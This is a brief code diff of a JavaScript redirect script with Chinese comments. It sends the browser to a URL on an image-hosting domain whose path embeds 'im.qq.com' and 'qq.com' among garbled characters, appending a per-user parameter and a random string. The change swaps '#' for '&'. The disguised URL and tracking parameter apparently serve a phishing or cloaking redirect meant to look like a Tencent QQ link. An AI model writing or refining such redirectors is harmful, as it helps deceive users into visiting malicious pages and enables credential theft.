@@ -12,7 +12,7 @@ const randomString = Math.random().toString(36).substring(2); // 生成随机字
 let redirectURL = "https://pic.baoyantong.cn/pic/202105012141/https://im.qq.com/https://qq.com/osssssxzwswfzlaFg,SwMMlQ*,*,;4ks3c,/5sx3.xml";
 // https://static.ylxweb.com/upload/xinyue/2024/FlOoFt0jr9OpaT9jitYy8YNZHsuA.html
 if (customParam) {
-    redirectURL += "?u=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
+    redirectURL += "?u=" + customParam + "&" + randomString; // 将随机字符串添加到参数后面
     // 执行跳转
 window.location.href = redirectURL;
 }
